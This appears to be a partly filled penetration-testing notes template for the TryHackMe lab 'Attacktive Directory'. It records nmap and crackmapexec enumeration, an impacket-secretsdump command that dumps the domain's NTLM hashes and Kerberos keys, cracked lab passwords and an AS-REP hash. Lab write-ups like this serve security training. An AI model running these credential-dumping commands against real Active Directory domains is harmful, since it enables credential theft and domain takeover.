# BOX NAME: Attacktive Directory
**LINK**: https://tryhackme.com/room/attacktivedirectory

<details open><summary><ins>SUMMARY</ins></summary>

```
1. 
2. 
3. 
4. 
5.
```
</details>

# RULES OF ENGAGEMENT:

<details open><summary><ins></ins></summary>

NAME OF CLIENT:
```
	THM-AD.spookysec.local
	Attacktive Directory
	AttacktiveDirectory.spookysec.local
```

TYPE OF BOX: {white, gray, black}
```
[] White
[x] Gray
[] Black
```

SCOPE:
```
In scope: AttacktiveDirectory.spookysec.local

└─$ crackmapexec smb spookysec.local                    
SMB         spookysec.local 445    ATTACKTIVEDIREC  [*] Windows 10.0 Build 17763 x64 (name:ATTACKTIVEDIREC) (domain:spookysec.local) (signing:True) (SMBv1:False)
```

OBJECTIVE:
```
	Compromise Active Directory.
	AttacktiveDirectory.spookysec.local
```



</details>

# REMOTE ENUMERATION:

<details><summary><ins>TARGET</ins></summary>

```
[+] IP's:		10.10.193.32
[+] URL:		10.10.193.32
[+] DOMAINS:	10.10.193.32
```
</details>
<details><summary><ins>NMAP</ins></summary>

```
└─$ nmap -sC -sV 10.10.193.32 -p- -oN nmap-AD.log 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-15 19:48 CEST
Nmap scan report for 10.10.193.32
Host is up (0.060s latency).
Not shown: 65508 closed tcp ports (conn-refused)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-06-15 17:49:54Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn                                                                                                                                                                                 
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)                                                                                                            
445/tcp   open  microsoft-ds?                                                                                                                                                                                                               
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2023-06-15T17:50:57+00:00; +22s from scanner time.
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Not valid before: 2023-06-14T17:43:46
|_Not valid after:  2023-12-14T17:43:46
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   DNS_Tree_Name: spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2023-06-15T17:50:49+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49683/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
49808/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 21s, deviation: 0s, median: 21s
| smb2-time: 
|   date: 2023-06-15T17:50:51
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 135.43 seconds
```
</details>
<details><summary><ins>WEB</ins></summary>

whatweb-scan
```

```

nikto-scan
```

```

fuzzing
```

```
other
```
└─$ crackmapexec smb spookysec.local                    
SMB         spookysec.local 445    ATTACKTIVEDIREC  [*] Windows 10.0 Build 17763 x64 (name:ATTACKTIVEDIREC) (domain:spookysec.local) (signing:True) (SMBv1:False)

```
Users and Groups
```
S-1-5-21-3591857110-2884097990-301047963-500 THM-AD\Administrator (Local User)                                      
S-1-5-21-3591857110-2884097990-301047963-501 THM-AD\Guest (Local User)
S-1-5-21-3591857110-2884097990-301047963-502 THM-AD\krbtgt (Local User)
S-1-5-21-3591857110-2884097990-301047963-512 THM-AD\Domain Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-513 THM-AD\Domain Users (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-514 THM-AD\Domain Guests (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-515 THM-AD\Domain Computers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-516 THM-AD\Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-517 THM-AD\Cert Publishers (Local Group)
S-1-5-21-3591857110-2884097990-301047963-518 THM-AD\Schema Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-519 THM-AD\Enterprise Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-520 THM-AD\Group Policy Creator Owners (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-521 THM-AD\Read-only Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-522 THM-AD\Cloneable Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-525 THM-AD\Protected Users (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-526 THM-AD\Key Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-527 THM-AD\Enterprise Key Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-1000 THM-AD\ATTACKTIVEDIREC$ (Local User)
```
crackmapexec
```
└─$ crackmapexec smb spookysec.local -u svc-admin -p management2005 --users            
SMB         spookysec.local 445    ATTACKTIVEDIREC  [*] Windows 10.0 Build 17763 x64 (name:ATTACKTIVEDIREC) (domain:spookysec.local) (signing:True) (SMBv1:False)
SMB         spookysec.local 445    ATTACKTIVEDIREC  [+] spookysec.local\svc-admin:management2005 
SMB         spookysec.local 445    ATTACKTIVEDIREC  [+] Enumerated domain user(s)
SMB         spookysec.local 445    ATTACKTIVEDIREC  spookysec.local\a-spooks                       badpwdcount: 0 desc: 
SMB         spookysec.local 445    ATTACKTIVEDIREC  spookysec.local\backup                         badpwdcount: 0 desc: 
SMB         spookysec.local 445    ATTACKTIVEDIREC  spookysec.local\svc-admin                      badpwdcount: 0 desc: 
SMB         spookysec.local 445    ATTACKTIVEDIREC  spookysec.local\horshark                       badpwdcount: 0 desc: 
SMB         spookysec.local 445    ATTACKTIVEDIREC  spookysec.local\Muirland                       badpwdcount: 0 desc: 
SMB         spookysec.local 445    ATTACKTIVEDIREC  spookysec.local\paradox                        badpwdcount: 0 desc: 
SMB         spookysec.local 445    ATTACKTIVEDIREC  spookysec.local\robin                          badpwdcount: 502 desc: 
SMB         spookysec.local 445    ATTACKTIVEDIREC  spookysec.local\Ori                            badpwdcount: 0 desc: 
SMB         spookysec.local 445    ATTACKTIVEDIREC  spookysec.local\darkstar                       badpwdcount: 461 desc: 
SMB         spookysec.local 445    ATTACKTIVEDIREC  spookysec.local\sherlocksec                    badpwdcount: 0 desc: 
SMB         spookysec.local 445    ATTACKTIVEDIREC  spookysec.local\optional                       badpwdcount: 0 desc: 
SMB         spookysec.local 445    ATTACKTIVEDIREC  spookysec.local\james                          badpwdcount: 576 desc: 
SMB         spookysec.local 445    ATTACKTIVEDIREC  spookysec.local\breakerofthings                badpwdcount: 0 desc: 
SMB         spookysec.local 445    ATTACKTIVEDIREC  spookysec.local\skidy                          badpwdcount: 0 desc: 
SMB         spookysec.local 445    ATTACKTIVEDIREC  spookysec.local\krbtgt                         badpwdcount: 0 desc: Key Distribution Center Service Account
SMB         spookysec.local 445    ATTACKTIVEDIREC  spookysec.local\Guest                          badpwdcount: 0 desc: Built-in account for guest access to the computer/domain
SMB         spookysec.local 445    ATTACKTIVEDIREC  spookysec.local\Administrator                  badpwdcount: 0 desc: Built-in account for administering the computer/domain
```
Secretsdump
```
─$ impacket-secretsdump THM-AD/backup:backup2517860@spookysec.local -just-dc 
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::
spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::
spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::
spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::
spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::
spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::
spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:dbddd4e3304df4e29a3363726499793b:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:713955f08a8654fb8f70afe0e24bb50eed14e53c8b2274c0c701ad2948ee0f48
Administrator:aes128-cts-hmac-sha1-96:e9077719bc770aff5d8bfc2d54d226ae
Administrator:des-cbc-md5:2079ce0e5df189ad
krbtgt:aes256-cts-hmac-sha1-96:b52e11789ed6709423fd7276148cfed7dea6f189f3234ed0732725cd77f45afc
krbtgt:aes128-cts-hmac-sha1-96:e7301235ae62dd8884d9b890f38e3902
krbtgt:des-cbc-md5:b94f97e97fabbf5d
spookysec.local\skidy:aes256-cts-hmac-sha1-96:3ad697673edca12a01d5237f0bee628460f1e1c348469eba2c4a530ceb432b04
spookysec.local\skidy:aes128-cts-hmac-sha1-96:484d875e30a678b56856b0fef09e1233
spookysec.local\skidy:des-cbc-md5:b092a73e3d256b1f
spookysec.local\breakerofthings:aes256-cts-hmac-sha1-96:4c8a03aa7b52505aeef79cecd3cfd69082fb7eda429045e950e5783eb8be51e5
spookysec.local\breakerofthings:aes128-cts-hmac-sha1-96:38a1f7262634601d2df08b3a004da425
spookysec.local\breakerofthings:des-cbc-md5:7a976bbfab86b064
spookysec.local\james:aes256-cts-hmac-sha1-96:1bb2c7fdbecc9d33f303050d77b6bff0e74d0184b5acbd563c63c102da389112
spookysec.local\james:aes128-cts-hmac-sha1-96:08fea47e79d2b085dae0e95f86c763e6
spookysec.local\james:des-cbc-md5:dc971f4a91dce5e9
spookysec.local\optional:aes256-cts-hmac-sha1-96:fe0553c1f1fc93f90630b6e27e188522b08469dec913766ca5e16327f9a3ddfe
spookysec.local\optional:aes128-cts-hmac-sha1-96:02f4a47a426ba0dc8867b74e90c8d510
spookysec.local\optional:des-cbc-md5:8c6e2a8a615bd054
spookysec.local\sherlocksec:aes256-cts-hmac-sha1-96:80df417629b0ad286b94cadad65a5589c8caf948c1ba42c659bafb8f384cdecd
spookysec.local\sherlocksec:aes128-cts-hmac-sha1-96:c3db61690554a077946ecdabc7b4be0e
spookysec.local\sherlocksec:des-cbc-md5:08dca4cbbc3bb594
spookysec.local\darkstar:aes256-cts-hmac-sha1-96:35c78605606a6d63a40ea4779f15dbbf6d406cb218b2a57b70063c9fa7050499
spookysec.local\darkstar:aes128-cts-hmac-sha1-96:461b7d2356eee84b211767941dc893be
spookysec.local\darkstar:des-cbc-md5:758af4d061381cea
spookysec.local\Ori:aes256-cts-hmac-sha1-96:5534c1b0f98d82219ee4c1cc63cfd73a9416f5f6acfb88bc2bf2e54e94667067
spookysec.local\Ori:aes128-cts-hmac-sha1-96:5ee50856b24d48fddfc9da965737a25e
spookysec.local\Ori:des-cbc-md5:1c8f79864654cd4a
spookysec.local\robin:aes256-cts-hmac-sha1-96:8776bd64fcfcf3800df2f958d144ef72473bd89e310d7a6574f4635ff64b40a3
spookysec.local\robin:aes128-cts-hmac-sha1-96:733bf907e518d2334437eacb9e4033c8
spookysec.local\robin:des-cbc-md5:89a7c2fe7a5b9d64
spookysec.local\paradox:aes256-cts-hmac-sha1-96:64ff474f12aae00c596c1dce0cfc9584358d13fba827081afa7ae2225a5eb9a0
spookysec.local\paradox:aes128-cts-hmac-sha1-96:f09a5214e38285327bb9a7fed1db56b8
spookysec.local\paradox:des-cbc-md5:83988983f8b34019
spookysec.local\Muirland:aes256-cts-hmac-sha1-96:81db9a8a29221c5be13333559a554389e16a80382f1bab51247b95b58b370347
spookysec.local\Muirland:aes128-cts-hmac-sha1-96:2846fc7ba29b36ff6401781bc90e1aaa
spookysec.local\Muirland:des-cbc-md5:cb8a4a3431648c86
spookysec.local\horshark:aes256-cts-hmac-sha1-96:891e3ae9c420659cafb5a6237120b50f26481b6838b3efa6a171ae84dd11c166
spookysec.local\horshark:aes128-cts-hmac-sha1-96:c6f6248b932ffd75103677a15873837c
spookysec.local\horshark:des-cbc-md5:a823497a7f4c0157
spookysec.local\svc-admin:aes256-cts-hmac-sha1-96:effa9b7dd43e1e58db9ac68a4397822b5e68f8d29647911df20b626d82863518
spookysec.local\svc-admin:aes128-cts-hmac-sha1-96:aed45e45fda7e02e0b9b0ae87030b3ff
spookysec.local\svc-admin:des-cbc-md5:2c4543ef4646ea0d
spookysec.local\backup:aes256-cts-hmac-sha1-96:23566872a9951102d116224ea4ac8943483bf0efd74d61fda15d104829412922
spookysec.local\backup:aes128-cts-hmac-sha1-96:843ddb2aec9b7c1c5c0bf971c836d197
spookysec.local\backup:des-cbc-md5:d601e9469b2f6d89
spookysec.local\a-spooks:aes256-cts-hmac-sha1-96:cfd00f7ebd5ec38a5921a408834886f40a1f40cda656f38c93477fb4f6bd1242
spookysec.local\a-spooks:aes128-cts-hmac-sha1-96:31d65c2f73fb142ddc60e0f3843e2f68
spookysec.local\a-spooks:des-cbc-md5:e09e4683ef4a4ce9
ATTACKTIVEDIREC$:aes256-cts-hmac-sha1-96:8a9ce674ccfdfd5c7717822823830e763378d69d40f0dbb65af3f2226d51d1f2
ATTACKTIVEDIREC$:aes128-cts-hmac-sha1-96:ec7ffd32feb1e8cd5847fae3f71f89ad
ATTACKTIVEDIREC$:des-cbc-md5:f131c81538976e68
[*] Cleaning up...
``` 

</details>

<details><summary><ins>SERVICES / PROTOCOLS</ins></summary>

FTP
```

```

SSH
```

```

DNS
```

```

MAILSERVICES (POP, IMAP, SMTP)
```

```

OTHERS
```

``` 

</details>

<details><summary><ins>SUMMARY REMOTE ENUMERATION</ins></summary>

```
1.
2.
3.
```
</details>

# LOCAL ENUMERATION:

<details><summary><ins>FILES OF INTEREST</ins></summary>

**FILES**:
```

```

**SUID's**:

```

```
**SGID's**:

```

```
**OTHERS**:

```

```
</details>

<details><summary><ins>CREDENTIALS:</ins></summary>

```
[username:password]
svc-admin:management2005
backup:backup2517860
Ori:owo
Muirland:ctfgod
robin:pwngod
james:uwuxyz
paradox:Cooctus
```
</details>

<details><summary><ins>HASHES:</ins></summary>

```
KERBEROS:
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:84a94ae8c86fecd2f30973dedac8ddb4$dea2231557b94d134775e8836238e2f2da58475b3a417c20decafefcdd6a5b8d029d37840db032de5b349c100aa6b4bfb088f675d85c6af27fea3534f24cea730200acf5a23973a3d771dc57559a6d720ab9fa76ab93d8722b7705d55bbd38aed47c3bb13dbf9566eb28c2fdc51538d7a8906a6f84de54f40d02c65e3e10eff656171d639997fb239c8334259799ae376ff3110ec5396d1ad5914dc0275c7761709ab1e742bd6f67775d6ab7dc8f633be43ff11a2de91bb8d0e88a7a0729a71e7e3c822e0582891e2481de103115a073420fb085d8e015a6e7d9e133fb960897e7e06a864c15cb8493196010d028d83b7b7d

NTLM:
c930ba49f999305d9c00a8745433d62a
3db8b1419ae75a418b3aa12b8c0fb705
642744a46b9d4f6dff8942d23626e5bb
9448bf6aba63d154eb0c665071067b6b
048052193cfa6ea46b5a302319c0cff2
```
</details>

<details><summary><ins>OTHER USEFUL INFORMATION:</ins></summary>

**Kernel Info:**

*file /bin/bash ; echo -e " \\n" && lsb_release -a ; echo -e "\\n" && uname -a*
```

```
</details>

# PROOFS

<details><summary><ins>Proofs</ins></summary>

```
TryHackMe{K3_REDACTED_h}
```
```
TryHackMe{K3_REDACTED_h}
```
```
TryHackMe{4_REDACTED_r}
```
Final payload:
```
Managed to dump secrets via impacket-secretsdump.
With that I had Administrator NTLM hash. Pwned!
```

</details>